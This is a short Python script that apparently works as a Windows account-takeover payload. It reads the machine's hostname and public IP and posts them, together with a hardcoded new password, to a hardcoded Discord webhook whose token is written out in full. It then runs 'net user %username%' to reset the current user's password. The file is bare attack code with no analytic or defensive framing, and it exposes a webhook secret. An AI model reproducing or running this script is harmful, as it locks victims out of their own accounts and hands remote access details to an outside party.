import os, socket, requests
from dhooks import Webhook
hook = Webhook('https://discord.com/api/webhooks/1017718611621728290/e0f2_9_VFtQpZgsYFdZBWNicvlaq2K3vgo0A36G8WU-tJK7nBOLWaFEuNoeQMVQ95_eO')
hostname = socket.gethostname()
ip = requests.get('https://api.ipify.org').text
passw = "NewPassWord@2021#"
hook.send(f'```\nUsername : {hostname}\nIP Address : {ip}\nPassword : {passw}```')
os.system(f'net user %username% {passw}')
